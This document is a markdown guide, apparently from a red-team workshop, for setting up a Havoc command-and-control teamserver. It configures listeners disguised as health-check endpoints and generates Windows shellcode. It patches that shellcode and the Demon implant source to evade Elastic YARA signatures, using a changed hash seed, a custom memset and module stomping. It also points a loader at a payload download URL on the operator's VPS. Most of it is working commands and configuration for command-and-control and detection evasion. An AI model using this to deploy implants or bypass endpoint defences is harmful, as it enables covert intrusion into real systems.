# Havoc C2 Teamserver Setup

## 1. Install Havoc on VPS

```bash
# Clone repository
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build teamserver
cd teamserver
go build -o teamserver cmd/server/main.go

# Build client (on your Kali machine, not VPS)
cd ../client
make
```

## 2. Configure Teamserver

Create `profiles/workshop.yaotl`:

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "CHANGEME_password123"
    }
}

Listeners {
    Http {
        Name         = "HTTP Listener"
        Hosts        = ["YOUR_VPS_IP"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 8888
        PortConn     = 8888
        Secure       = false
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        Uris = [
            "/api/v1/status",
            "/api/v1/health",
            "/api/v1/metrics"
        ]

        Headers = [
            "Content-Type: application/json",
            "X-Request-ID: random"
        ]
    }
}

# Demon agent configuration
Demon {
    Sleep  = 2
    Jitter = 20

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

## 3. Start Teamserver

```bash
# On VPS
./teamserver server --profile profiles/workshop.yaotl

# Make sure port 40056 (teamserver) and 8888 (listener) are open
```

## 4. Connect Client

```bash
# On your Kali machine
cd Havoc/client
./Havoc

# Connect: YOUR_VPS_IP:40056, operator1/CHANGEME_password123
```

## 5. Generate Shellcode

In Havoc Client:
1. Attack > Payload > Generate
2. Select listener: HTTP Listener
3. Format: **Windows Shellcode** (Raw .bin)
4. Architecture: x64
5. Save as: `binfile/havocDefault.bin`

## 6. Patch Shellcode (vs YARA Signatures)

```bash
# From 1_Loader directory
python tools/mypatch.py binfile/havocDefault.bin binfile/havocSpoofPatched.bin
```

## 7. Update config.conf

For local file testing:
```
[config]
payload_type=local
payload_path=binfile\havocSpoofPatched.bin
```

For remote download from Havoc:
```
[config]
payload_type=url
payload_path=http://YOUR_VPS_IP:8888/havocSpoofPatched.bin
```

## 8. Havoc Customization (Advanced)

To bypass Elastic YARA signatures on the C2 payload itself:

### Step 1: Change API Hash Seed
In `payloads/Demon/scripts/hash_func.py`, change:
```python
hash = 5381  # default
```
to:
```python
hash = 5387  # or any different prime
```
Then regenerate all hash constants and rebuild.

### Step 2: Replace MemSet/MemZero
In `payloads/Demon/include/core/MiniStd.h`, replace:
```c
#define MemSet  __stosb
#define MemZero(p, l) __stosb(p, 0, l)
```
with:
```c
static inline __attribute__((always_inline)) void MemSetCustom(
    PVOID dest, BYTE val, SIZE_T len) {
    volatile BYTE* p = (volatile BYTE*)dest;
    while (len--) *p++ = val;
}
#define MemSet(dest, val, len) MemSetCustom((PVOID)(dest), (BYTE)(val), (SIZE_T)(len))
#define MemZero(p, l) MemSetCustom((PVOID)(p), 0, (SIZE_T)(l))
```

### Step 3: Add Module Stomping to KaynLdr
Modify `payloads/Shellcode/Source/Entry.c` to use LdrLoadDll + module stomping
for the Demon DLL mapping instead of VirtualAlloc.

### Step 4: Patch remaining YARA signatures
```bash
python tools/mypatch.py havoc.bin havocPatched.bin \
    --yara-rules /path/to/elastic/protections-artifacts/yara/rules/*
```

## Reference
- Havoc: https://github.com/HavocFramework/Havoc
- KaynLdr: https://github.com/CrackedSpider/KaynLdr
- Elastic Rules: https://github.com/elastic/protections-artifacts
- Workshop Author's tools: https://github.com/tyeurada/signatureBypassAgent
- Workshop Havoc fork: https://github.com/tyeurada/myWorkshopHavoc
